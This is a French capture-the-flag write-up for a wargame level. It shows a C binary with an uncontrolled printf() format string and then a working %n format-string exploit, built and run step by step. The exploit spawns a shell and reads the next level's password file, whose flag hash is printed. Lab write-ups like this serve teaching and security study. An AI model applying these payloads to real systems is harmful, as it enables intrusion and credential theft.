# Level 3

Voici le code source du binaire

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

uint m;

void v(void)
{
    char buff[520];

    fgets(buff, 512, stdin);
    printf(buff);
    if (m == 64)
    {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
    return;
}

void main(void)
{
    v();
    return;
}
```

Dans ce cas, il faut que la valeur de `m` soit egale a 64 pour executer un shell. Nous allons donc utiliser `printf()` pour modifier cette variable grace a `%n`. Ce flag nous permet d'ecrire le nombre de caracteres dans une string a une adresse donne.
Etant donne que `m` est une variable globale nous pouvons utiliser son adresse dans tout le programme. Avec `Ghidra` nous pouvons voir l'adresse de `m`: `0x0804988c`
L'idee derriere ceci est de creer une string qui serait interpretee par `printf()` pour ecrire 64 dans `m`:

```bash
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'
```

Nous placons l'adresse de `m` au debut de notre string puis nous ajoutons 60 `A` (total: 64). Ensuite nous disons a `printf()` d'utiliser sont quatrieme argument comme argument de `%n`: `%4$n`. Nous pouvons verifier comme ceci que notre adresse est bien le 4eme argument de printf:

```bash
python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"'
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
```

`61616161` equivaut a notre chaine `"aaaa"` en ASCII

```bash
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' ; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
